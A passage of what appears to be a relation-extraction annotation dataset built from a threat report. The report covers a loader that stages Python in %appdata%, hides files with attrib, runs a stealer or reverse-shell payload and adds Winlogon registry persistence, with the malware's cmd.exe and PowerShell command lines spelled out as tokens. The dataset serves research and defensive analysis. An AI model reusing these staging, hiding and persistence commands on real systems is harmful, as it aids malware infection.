"has", "been", "retrieved", ",", "it", "is", "then", "unzipped", "into", "the", "directory", "that", "was", "previously", "created", "using", "the", "PowerShell", "``", "Expand-Archive", "''", "cmdlet", "."], ["C", ":", "\\Windows\\system32\\cmd.exe", "/c", "cd", "%", "appdata", "%", "\\Microsoft\\Network", "&", "&", "powershell", "Expand-Archive", "python-3.10"], ["4-embed-amd64.zip", "-DestinationPath", "%", "appdata", "%", "\\Microsoft\\NetworkThe", "malware", "then", "attempts", "to", "retrieve", "the", "final", "payload", "in", "the", "infection", "chain", ",", "storing", "it", "within", "the", "Network", "directory", "using", "the", "filename", "``", "Packages.txt", "''", "."], ["An", "example", "of", "the", "loader", "retrieving", "Hannabi", "Grabber", ",", "an", "information", "stealer", "written", "in", "Python", "is", "shown", "below", "."], ["The", "loader", "then", "uses", "the", "attrib.exe", "utility", "to", "set", "the", "System", "and", "Hidden", "flags", "on", "the", "previously", "created", "directory", "as", "well", "as", "the", "Python", "ZIP", "archive", "and", "final", "payload", "that", "was", "retrieved", "."], ["4-embed-amd64.zipC", ":", "\\Windows\\system32\\cmd.exe", "/c", "attrib", "+S", "+H", "%", "appdata", "%", "\\Microsoft\\Network\\Packages.txtFinally", ",", "the", "loader", "invokes", "the", "newly", "downloaded", "Python", "executable", "and", "passes", "the", "final", "payload", "as", "a", "command", "line", "argument", ",", "executing", "the", "next", "stage", "of", "the", "infection", "process", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [4, 4], "name": "loader", "pos": [4, 5], "index": "0_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [11, 11], "name": "% APPDATA %", "pos": [11, 14], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [32, 32], "name": "malware", "pos": [32, 33], "index": "2_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [37, 37], "name": "Python 3.10", "pos": [37, 39], "index": "3_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [42, 42], "name": "software provider", "pos": [42, 44], "index": "4_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [64, 64], "name": "ZIP archive", "pos": [2, 4], "index": "5_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [70, 70], "name": "it", "pos": [8, 9], "index": "6_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [109, 109], "name": "malware", "pos": [6, 7], "index": "7_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [116, 116], "name": "payload", "pos": [13, 14], "index": "8_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [123, 123], "name": "it", "pos": [20, 21], "index": "9_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [132, 132], "name": "Packages.txt", "pos": [29, 30], "index": "10_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [139, 139], "name": "loader", "pos": [4, 5], "index": "11_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [141, 141], "name": "Hannabi Grabber", "pos": [6, 8], "index": "12_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [155, 155], "name": "loader", "pos": [1, 2], "index": "13_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [159, 159], "name": "attrib.exe", "pos": [5, 6], "index": "14_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [177, 177], "name": "Python ZIP archive", "pos": [23, 26], "index": "15_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [182, 182], "name": "payload", "pos": [28, 29], "index": "16_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [200, 200], "name": "loader", "pos": [13, 14], "index": "17_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [205, 205], "name": "Python executable", "pos": [18, 20], "index": "18_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [211, 211], "name": "payload", "pos": [24, 25], "index": "19_0"}]], "labels": [{"r": "RD", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 2, "t": 3}, {"r": "ST", "evidence": [0], "h": 2, "t": 4}, {"r": "RF", "evidence": [0], "h": 2, "t": 4}, {"r": "WR", "evidence": [0, 1, 2], "h": 2, "t": 5}, {"r": "RD", "evidence": [0, 1, 2], "h": 2, "t": 5}, {"r": "CO", "evidence": [0, 1, 2], "h": 3, "t": 5}, {"r": "CO", "evidence": [0, 1, 2], "h": 3, "t": 6}, {"r": "CO", "evidence": [0, 1, 2, 3, 4], "h": 2, "t": 7}, {"r": "RD", "evidence": [4], "h": 7, "t": 8}, {"r": "WR", "evidence": [4], "h": 7, "t": 8}, {"r": "CO", "evidence": [4], "h": 8, "t": 10}, {"r": "CO", "evidence": [4], "h": 8, "t": 9}, {"r": "CO", "evidence": [4, 5], "h": 7, "t": 11}, {"r": "CO", "evidence": [4, 5, 6], "h": 7, "t": 13}, {"r": "CO", "evidence": [4, 5, 6, 7], "h": 7, "t": 17}, {"r": "WR", "evidence": [5], "h": 11, "t": 12}, {"r": "FR", "evidence": [6], "h": 13, "t": 14}, {"r": "CD", "evidence": [6], "h": 14, "t": 15}, {"r": "CD", "evidence": [6], "h": 14, "t": 16}, {"r": "FR", "evidence": [7], "h": 17, "t": 18}, {"r": "EX", "evidence": [6, 7], "t": 15, "h": 18}, {"r": "RD", "evidence": [7], "h": 18, "t": 19}]}, {"title": "608-23", "sents": [["The", "command", "line", "syntax", "used", "to", "initiate", "the", "download", "is", "shown", "below", "."], ["4-embed-amd64.zipOnce", "the", "ZIP", "archive", "has", "been", "retrieved", ",", "it", "is", "then", "unzipped", "into", "the", "directory", "that", "was", "previously", "created", "using", "the", "PowerShell", "``", "Expand-Archive", "''", "cmdlet", "."], ["C", ":", "\\Windows\\system32\\cmd.exe", "/c", "cd", "%", "appdata", "%", "\\Microsoft\\Network", "&", "&", "powershell", "Expand-Archive", "python-3.10"], ["4-embed-amd64.zip", "-DestinationPath", "%", "appdata", "%", "\\Microsoft\\NetworkThe", "malware", "then", "attempts", "to", "retrieve", "the", "final", "payload", "in", "the", "infection", "chain", ",", "storing", "it", "within", "the", "Network", "directory", "using", "the", "filename", "``", "Packages.txt", "''", "."], ["An", "example", "of", "the", "loader", "retrieving", "Hannabi", "Grabber", ",", "an", "information", "stealer", "written", "in", "Python", "is", "shown", "below", "."], ["The", "loader", "then", "uses", "the", "attrib.exe", "utility", "to", "set", "the", "System", "and", "Hidden", "flags", "on", "the", "previously", "created", "directory", "as", "well", "as", "the", "Python", "ZIP", "archive", "and", "final", "payload", "that", "was", "retrieved", "."], ["4-embed-amd64.zipC", ":", "\\Windows\\system32\\cmd.exe", "/c", "attrib", "+S", "+H", "%", "appdata", "%", "\\Microsoft\\Network\\Packages.txtFinally", ",", "the", "loader", "invokes", "the", "newly", "downloaded", "Python", "executable", "and", "passes", "the", "final", "payload", "as", "a", "command", "line", "argument", ",", "executing", "the", "next", "stage", "of", "the", "infection", "process", "."], ["C", ":", "\\Windows\\system32\\cmd.exe", "/c", "cd", "%", "appdata", "%", "\\Microsoft\\Network", "&", "&", "python.exe", "Packages.txtIn", "some", "cases", ",", "the", "malware", "was", "also", "observed", "achieving", "persistence", "via", "adding", "entries", "into", "the", "Windows", "registry", "at", "the", "following", "locations", ":", "HKLM\\Software\\Microsoft\\WindowsNT\\CurrentVersion\\Winlogon", "our", "analysis", "of", "samples", "associated", "with", "this", "loader", ",", "we", "observed", "that", "the", "IPFS", "gateway", "that", "was", "being", "used", "was", "no", "longer", "servicing", "requests", ",", "however", ",", "Talos", "obtained", "the", "ne"]], "vertexSet": [[{"type": "TF", "sent_id": 1, "global_pos": [15, 15], "name": "ZIP archive", "pos": [2, 4], "index": "0_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [21, 21], "name": "it", "pos": [8, 9], "index": "1_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [60, 60], "name": "malware", "pos": [6, 7], "index": "2_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [67, 67], "name": "payload", "pos": [13, 14], "index": "3_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [74, 74], "name": "it", "pos": [20, 21], "index": "4_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [83, 83], "name": "Packages.txt", "pos": [29, 30], "index": "5_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [90, 90], "name": "loader", "pos": [4, 5], "index": "6_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [92, 92], "name": "Hannabi Grabber", "pos": [6, 8], "index": "7_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [106, 106], "name": "loader", "pos": [1, 2], "index": "8_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [110, 110], "name": "attrib.exe", "pos": [5, 6], "index": "9_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [128, 128], "name": "Python ZIP archive", "pos": [23, 26], "index": "10_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [133, 133], "name": "payload", "pos": [28, 29], "index": "11_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [151, 151], "name": "loader", "pos": [13, 14], "index": "12_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [156, 156], "name": "Python executable", "pos": [18, 20], "index": "13_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [162, 162], "name": "payload", "pos": [24, 25], "index": "14_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [195, 195], "name": "malware", "pos": [17, 18], "index": "15_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [206, 206], "name": "Windows registry", "pos": [28, 30], "index": "16_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [221, 221], "name": "loader", "pos": [43, 44], "index": "17_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [227, 227], "name": "IPFS gateway", "pos": [49, 51], "index": "18_0"}]], "labels": [{"r": "RD", "evidence": [3], "h": 2, "t": 3}, {"r": "WR", "evidence": [3], "h": 2, "t": 3}, {"r": "CO", "evidence": [3], "h": 3, "t": 5}, {"r": "CO", "evidence": [3], "h": 3, "t": 4}, {"r": "CO", "evidence": [3, 4], "h": 2, "t": 6}, {"r": "CO", "evidence": [3, 4, 5], "h": 2, "t": 8}, {"r": "CO", "evidence": [3, 4, 5, 6], "h": 2, "t": 12}, {"r": "WR", "evidence": [4], "h": 6, "t": 7}, {"r": "FR", "evidence": [5], "h": 8, "t": 9}, {"r": "CD", "evidence": [5], "h": 9, "t": 10}, {"r": "CD", "evidence": [5], "h": 9, "t": 11}, {"r": "FR", "evidence": [6], "h": 12, "t": 13}, {"r": "EX", "evidence": [5, 6], "t": 10, "h": 13}, {"r": "RD", "evidence": [6], "h": 13, "t": 14}, {"r": "RD", "evidence": [7], "h": 15, "t": 16}, {"r": "RD", "evidence": [7], "h": 15, "t": 16}, {"r": "WR", "evidence": [7], "h": 15, "t": 16}, {"r": "RD", "evidence": [7], "t": 16, "h": 17}, {"r": "RD", "evidence": [7], "t": 16, "h": 17}, {"r": "WR", "evidence": [7], "t": 16, "h": 17}, {"r": "ST", "evidence": [7], "h": 17, "t": 18}, {"r": "RF", "evidence": [7], "h": 17, "t": 18}, {"r": "ST", "evidence": [7], "h": 17, "t": 18}, {"r": "RF", "evidence": [7], "h": 17, "t": 18}]}, {"title": "608-24", "sents": [["4-embed-amd64.zipOnce", "the", "ZIP", "archive", "has", "been", "retrieved", ",", "it", "is", "then", "unzipped", "into", "the", "directory", "that", "was", "previously", "created", "using", "the", "PowerShell", "``", "Expand-Archive", "''", "cmdlet", "."], ["C", ":", "\\Windows\\system32\\cmd.exe", "/c", "cd", "%", "appdata", "%", "\\Microsoft\\Network", "&", "&", "powershell", "Expand-Archive", "python-3.10"], ["4-embed-amd64.zip", "-DestinationPath", "%", "appdata", "%", "\\Microsoft\\NetworkThe", "malware", "then", "attempts", "to", "retrieve", "the", "final", "payload", "in", "the", "infection", "chain", ",", "storing", "it", "within", "the", "Network", "directory", "using", "the", "filename", "``", "Packages.txt", "''", "."], ["An", "example", "of", "the", "loader", "retrieving", "Hannabi", "Grabber", ",", "an", "information", "stealer", "written", "in", "Python", "is", "shown", "below", "."], ["The", "loader", "then", "uses", "the", "attrib.exe", "utility", "to", "set", "the", "System", "and", "Hidden", "flags", "on", "the", "previously", "created", "directory", "as", "well", "as", "the", "Python", "ZIP", "archive", "and", "final", "payload", "that", "was", "retrieved", "."], ["4-embed-amd64.zipC", ":", "\\Windows\\system32\\cmd.exe", "/c", "attrib", "+S", "+H", "%", "appdata", "%", "\\Microsoft\\Network\\Packages.txtFinally", ",", "the", "loader", "invokes", "the", "newly", "downloaded", "Python", "executable", "and", "passes", "the", "final", "payload", "as", "a", "command", "line", "argument", ",", "executing", "the", "next", "stage", "of", "the", "infection", "process", "."], ["C", ":", "\\Windows\\system32\\cmd.exe", "/c", "cd", "%", "appdata", "%", "\\Microsoft\\Network", "&", "&", "python.exe", "Packages.txtIn", "some", "cases", ",", "the", "malware", "was", "also", "observed", "achieving", "persistence", "via", "adding", "entries", "into", "the", "Windows", "registry", "at", "the", "following", "locations", ":", "HKLM\\Software\\Microsoft\\WindowsNT\\CurrentVersion\\Winlogon", "our", "analysis", "of", "samples", "associated", "with", "this", "loader", ",", "we", "observed", "that", "the", "IPFS", "gateway", "that", "was", "being", "used", "was", "no", "longer", "servicing", "requests", ",", "however", ",", "Talos", "obtained", "the", "ne"], ["Reverse", "shellIn", "one", "of", "the", "clusters", "leveraging", "this", "loader", ",", "we", "observed", "that", "the", "payload", "being", "hosted", "within", "the", "IPFS", "network", "was", "a", "Python", "script", "containing", "a", "large", "base64", "encoded", "blob", "along", "with", "the", "Python", "code", "responsible", "for", "decoding", "the", "base64", "."]], "vertexSet": [[{"type": "TF", "sent_id": 0, "global_pos": [2, 2], "name": "ZIP archive", "pos": [2, 4], "index": "0_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [8, 8], "name": "it", "pos": [8, 9], "index": "1_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [47, 47], "name": "malware", "pos": [6, 7], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [54, 54], "name": "payload", "pos": [13, 14], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [61, 61], "name": "it", "pos": [20, 21], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [70, 70], "name": "Packages.txt", "pos": [29, 30], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [77, 77], "name": "loader", "pos": [4, 5], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [79, 79], "name": "Hannabi Grabber", "pos": [6, 8], "index": "7_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [93, 93], "name": "loader", "pos": [1, 2], "index": "8_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [97, 97], "name": "attrib.exe", "pos": [5, 6], "index": "9_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [115, 115], "name": "Python ZIP archive", "pos": [23, 26], "index": "10_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [120, 120], "name": "payload", "pos": [28, 29], "index": "11_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [138, 138], "name": "loader", "pos": [13, 14], "index": "12_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [143, 143], "name": "Python executable", "pos": [18, 20], "index": "13_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [149, 149], "name": "payload", "pos": [24, 25], "index": "14_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [182, 182], "name": "malware", "pos": [17, 18], "index": "15_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [193, 193], "name": "Windows registry", "pos": [28, 30], "index": "16_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [208, 208], "name": "loader", "pos": [43, 44], "index": "17_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [214, 214], "name": "IPFS gateway", "pos": [49, 51], "index": "18_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [240, 240], "name": "loader", "pos": [8, 9], "index": "19_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [246, 246], "name": "payload", "pos": [14, 15], "index": "20_0"}]], "labels": [{"r": "RD", "evidence": [2], "h": 2, "t": 3}, {"r": "WR", "evidence": [2], "h": 2, "t": 3}, {"r": "CO", "evidence": [2], "h": 3, "t": 5}, {"r": "CO", "evidence": [2], "h": 3, "t": 4}, {"r": "CO", "evidence": [2, 3], "h": 2, "t": 6}, {"r": "CO", "evidence": [2, 3, 4], "h": 2, "t": 8}, {"r": "CO", "evidence": [2, 3, 4, 5], "h": 2, "t": 12}, {"r": "WR", "evidence": [3], "h": 6, "t": 7}, {"r": "FR", "evidence": [4], "h": 8, "t": 9}, {"r": "CD", "evidence": [4], "h": 9, "t": 10}, {"r": "CD", "evidence": [4], "h": 9, "t": 11}, {"r": "FR", "evidence": [5], "h": 12, "t": 13}, {"r": "EX", "evidence": [4, 5], "t": 10, "h": 13}, {"r": "RD", "evidence": [5], "h": 13, "t": 14}, {"r": "RD", "evidence": [6], "h": 15, "t": 16}, {"r": "RD", "evidence": [6], "h": 15, "t": 16}, {"r": "WR", "evidence": [6], "h": 15, "t": 16}, {"r": "RD", "evidence": [6], "t": 16, "h": 17}, {"r": "RD", "evidence": [6], "t": 16, "h": 17}, {"r": "WR", "evidence": [6], "t": 16, "h": 17}, {"r": "ST", "evidence": [6], "h": 17, "t": 18}, {"r": "RF", "evidence": [6], "h": 17, "t": 18}, {"r": "ST", "evidence": [6], "h": 17, "t": 18}, {"r": "RF", "evidence": [6], "h": 17, "t": 18}, {"r": "ST", "evidence": [6, 7], "t": 18, "h": 19}, {"r": "RF", "evidence": [6, 7], "t": 18, "h": 19}, {"r": "ST", "evidence": [6, 7], "t": 18, "h": 19}, {"r": "RF", "evidence": [6, 7], "t": 18, "h": 19}, {"r": "ST", "evidence": [6, 7], "t": 18, "h": 20}, {"r": "RF", "evidence": [6, 7], "t": 18, "h": 20}]}, {"title": "608-25", "sents": [["C", ":", "\\Windows\\system32\\cmd.exe", "/c", "cd", "%", "appdata", "%", "\\Microsoft\\Network", "&", "&", "powershell", "Expand-Archive", "python-3.10"], ["4-embed-amd64.zip", "-DestinationPath", "%", "appdata", "%", "\\Microsoft\\NetworkThe", "malware", "then", "attempts", "to", "retrieve", "the", "final", "payload", "in", "the", "infection", "chain", ",", "storing", "it", "within", "the", "Network", "directory", "using", "the", "filename", "``", "Packages.txt", "''", "."], ["An", "example", "of", "the", "loader", "retrieving", "Hannabi", "Grabber", ",", "an", "information", "stealer", "written", "in", "Python", "is", "shown", "below", "."], ["The", "loader", "then", "uses", "the", "attrib.exe", "utility", "to", "set", "the", "System", "and", "Hidden", "flags", "on", "the", "previously", "created", "directory", "as", "well", "as", "the", "Python", "ZIP", "archive", "and", "final", "payload", "that", "was", "retrieved", "."], ["4-embed-amd64.zipC", ":", "\\Windows\\system32\\cmd.exe", "/c", "attrib", "+S", "+H", "%", "appdata", "%", "\\Microsoft\\Network\\Packages.txtFinally", ",", "the", "loader", "invokes", "the", "newly", "downloaded", "Python", "executable", "and", "passes", "the", "final", "payload", "as", "a", "command", "line", "argument", ",", "executing", "the", "next", "stage", "of", "the", "infection", "process", "."], ["C", ":", "\\Windows\\system32\\cmd.exe", "/c", "cd", "%", "appdata", "%", "\\Microsoft\\Network", "&", "&", "python.exe", "Packages.txtIn", "some", "cases", ",", "the", "malware", "was", "also", "observed", "achieving", "persistence", "via", "adding", "entries", "into", "the", "Windows", "registry", "at", "the", "following", "locations", ":", "HKLM\\Software\\Microsoft\\WindowsNT\\CurrentVersion\\Winlogon", "our", "analysis", "of", "samples", "associated", "with", "this", "loader", ",", "we", "observed", "that", "the", "IPFS", "gateway", "that", "was", "being", "used", "was", "no", "longer", "servicing", "requests", ",", "however", ",", "Talos", "obtained", "the", "ne"], ["Reverse", "shellIn", "one", "of", "the", "clusters", "leveraging", "this", "loader", ",", "we", "observed", "that", "the", "payload", "being", "hosted", "within", "the", "IPFS", "network", "was", "a", "Python", "script", "containing", "a", "large", "base64", "encoded", "blob", "along", "with", "the", "Python", "code", "responsible", "for", "decoding", "the", "base64", "."], ["After", "decoding", "all", "of", "the", "layers", ",", "the", "following", "is", "the", "deobfuscated", "reverse", "shell", "payload", "."]], "vertexSet": [[{"type": "MP", "sent_id": 1, "global_pos": [20, 20], "name": "malware", "pos": [6, 7], "index": "0_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [27, 27], "name": "payload", "pos": [13, 14], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [34, 34], "name": "it", "pos": [20, 21], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [43, 43], "name": "Packages.txt", "pos": [29, 30], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [50, 50], "name": "loader", "pos": [4, 5], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [52, 52], "name": "Hannabi Grabber", "pos": [6, 8], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [66, 66], "name": "loader", "pos": [1, 2], "index": "6_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [70, 70], "name": "attrib.exe", "pos": [5, 6], "index": "7_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [88, 88], "name": "Python ZIP archive", "pos": [23, 26], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [93, 93], "name": "payload", "pos": [28, 29], "index": "9_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [111, 111], "name": "loader", "pos": [13, 14], "index": "10_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [116, 116], "name": "Python executable", "pos": [18, 20], "index": "11_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [122, 122], "name": "payload", "pos": [24, 25], "index": "12_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [155, 155], "name": "malware", "pos": [17, 18], "index": "13_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [166, 166], "name": "Windows registry", "pos": [28, 30], "index": "14_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [181, 181], "name": "loader", "pos": [43, 44], "index": "15_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [187, 187], "name": "IPFS gateway", "pos": [49, 51], "index": "16_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [213, 213], "name": "loader", "pos": [8, 9], "index": "17_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [219, 219], "name": "payload", "pos": [14, 15], "index": "18_0"}]], "labels": [{"r": "RD", "evidence": [1], "h": 0, "t": 1}, {"r": "WR", "evidence": [1], "h": 0, "t": 1}, {"r": "CO", "evidence": [1], "h": 1, "t": 3}, {"r": "CO", "evidence": [1], "h": 1, "t": 2}, {"r": "CO", "evidence": [1, 2], "h": 0, "t": 4}, {"r": "CO", "evidence": [1, 2, 3], "h": 0, "t": 6}, {"r": "CO", "evidence": [1, 2, 3, 4], "h": 0, "t": 10}, {"r": "WR", "evidence": [2], "h": 4, "t": 5}, {"r": "FR", "evidence": [3], "h": 6, "t": 7}, {"r": "CD", "evidence": [3], "h": 7, "t": 8}, {"r": "CD", "evidence": [3], "h": 7, "t": 9}, {"r": "FR", "evidence": [4], "h": 10, "t": 11}, {"r": "EX", "evidence": [3, 4], "t": 8, "h": 11}, {"r": "RD", "evidence": [4], "h": 11, "t": 12}, {"r": "RD", "evidence": [5], "h": 13, "t": 14}, {"r": "RD", "evidence": [5], "h": 13, "t": 14}, {"r": "WR", "evidence": [5], "h": 13, "t": 14}, {"r": "RD", "evidence": [5], "t": 14, "h": 15}, {"r": "RD", "evidence": [5], "t": 14, "h": 15}, {"r": "WR", "evidence": [5], "t": 14, "h": 15}, {"r": "ST", "evidence": [5], "h": 15, "t": 16}, {"r": "RF", "evidence": [5], "h": 15, "t": 16}, {"r": "ST", "evidence": [5], "h": 15, "t": 16}, {"r": "RF", "evidence": [5], "h": 15, "t": 16}, {"r": "ST", "evidence": [5, 6], "t": 16, "h": 17}, {"r": "RF", "evidence": [5, 6], "t": 16, "h": 17}, {"r": "ST", "evidence": [5, 6], "t": 16, "h": 17}, {"r": "RF", "evidence": [5, 6], "t": 16, "h": 17}, {"r": "ST", "evidence": [5, 6], "t": 16, "h": 18}, {"r": "RF", "evidence": [5, 6], "t": 16, "h": 18}]}, {"title": "608-26", "sents": [["4-embed-amd64.zip", "-DestinationPath", "%", "appdata", "%", "\\Microsoft\\NetworkThe", "malware", "then", "attempts", "to", "retrieve", "the", "final", "payload", "in", "the", "infection", "chain", ",", "storing", "it", "within", "the", "Network", "directory", "using", "the", "filename", "``", "Packages.txt", "''", "."], ["An", "example", "of", "the", "loader", "retrieving", "Hannabi", "Grabber", ",", "an", "information", "stealer", "written", "in", "Python", "is", "shown", "below", "."], ["The", "loader", "then", "uses", "the", "attrib.exe", "utility", "to", "set", "the", "System", "and", "Hidden", "flags", "on", "the", "previously", "created", "directory", "as", "well", "as", "the", "Python", "ZIP", "archive", "and", "final", "payload", "that", "was", "retrieved", "."], ["4-embed-amd64.zipC", ":", "\\Windows\\system32\\cmd.exe", "/c", "attrib", "+S", "+H", "%", "appdata", "%", "\\Microsoft\\Network\\Packages.txtFinally", ",", "the", "loader", "invokes", "the", "newly", "downloaded", "Python", "executable", "and", "passes", "the", "final", "payload", "as", "a", "command", "line", "argument", ",", "executing", "the", "next", "stage", "of", "the", "infection", "process", "."], ["C", ":", "\\Windows\\system32\\cmd.exe", "/c", "cd", "%", "appdata", "%", "\\Microsoft\\Network", "&", "&", "python.exe", "Packages.txtIn", "some", "cases", ",", "the", "malware", "was", "also", "observed", "achieving", "persistence", "via", "adding", "entries", "into", "the", "Windows", "registry", "at", "the", "following", "locations", ":", "HKLM\\Software\\Microsoft\\WindowsNT\\CurrentVersion\\Winlogon", "our", "analysis", "of", "samples", "associated", "with", "this", "loader", ",", "we", "observed", "that", "the", "IPFS", "gateway", "that", "was", "being", "used", "was", "no", "longer", "servicing", "requests", ",", "however", ",", "Talos", "obtained", "the", "ne"], ["Reverse", "shellIn", "one", "of", "the", "clusters", "leveraging", "this", "loader", ",", "we", "observed", "that", "the", "payload", "being", "hosted", "within", "the", "IPFS", "network", "was", "a", "Python", "script", "containing", "a", "large", "base64", "encoded", "blob", "along", "with", "the", "Python", "code", "responsible", "for", "decoding", "the", "base64", "."], ["After", "decoding", "all", "of", "the", "layers", ",", "the", "following", "is", "the", "deobfuscated", "reverse", "shell", "payload", "."], ["At", "the", "time", "of", "analysis", ",", "the", "C2", "server", "was", "no", "longer", "servicing", "requests", "on", "TCP/4444", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [6, 6], "name": "malware", "pos": [6, 7], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [13, 13], "name": "payload", "pos": [13, 14], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [20, 20], "name": "it", "pos": [20, 21], "index": "2_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [29, 29], "name": "Packages.txt", "pos": [29, 30], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [36, 36], "name": "loader", "pos": [4, 5], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [38, 38], "name": "Hannabi Grabber", "pos": [6, 8], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [52, 52], "name": "loader", "pos": [1, 2], "index": "6_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [56, 56], "name": "attrib.exe", "pos": [5, 6], "index": "7_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [74, 74], "name": "Python ZIP archive", "pos": [23, 26], "index": "8_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [79, 79], "name": "payload", "pos": [28, 29], "index": "9_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [97, 97], "name": "loader", "pos": [13, 14], "index": "10_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [102, 102], "name": "Python executable", "pos": [18, 20], "index": "11_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [108, 108], "name": "payload", "pos": [24, 25], "index": "12_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [141, 141], "name": "malware", "pos": [17, 18], "index": "13_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [152, 152], "name": "Windows registry", "pos": [28, 30], "index": "14_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [167, 167], "name": "loader", "pos": [43, 44], "index": "15_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [173, 173], "name": "IPFS gateway", "pos": [49, 51], "index": "16_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [199, 199], "name": "loader", "pos": [8, 9], "index": "17_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [205, 205], "name": "payload", "pos": [14, 15], "index": "18_0"}]], "labels": [{"r": "RD", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "CO", "evidence": [0], "h": 1, "t": 3}, {"r": "CO", "evidence": [0], "h": 1, "t": 2}, {"r": "CO", "evidence": [0, 1], "h": 0, "t": 4}, {"r": "CO", "evidence": [0, 1, 2], "h": 0, "t": 6}, {"r": "CO", "evidence": [0, 1, 2, 3], "h": 0, "t": 10}, {"r": "WR", "evidence": [1], "h": 4, "t": 5}, {"r": "FR", "evidence": [2], "h": 6, "t": 7}, {"r": "CD", "evidence": [2], "h": 7, "t": 8}, {"r": "CD", "evidence": [2], "h": 7, "t": 9}, {"r": "FR", "evidence": [3], "h": 10, "t": 11}, {"r": "EX", "evidence": [2, 3], "t": 8, "h": 11}, {"r": "RD", "evidence": [3], "h": 11, "t": 12}, {"r": "RD", "evidence": [4], "h": 13, "t": 14}, {"r": "RD", "evidence": [4], "h": 13, "t": 14}, {"r": "WR", "evidence": [4], "h": 13, "t": 14}, {"r": 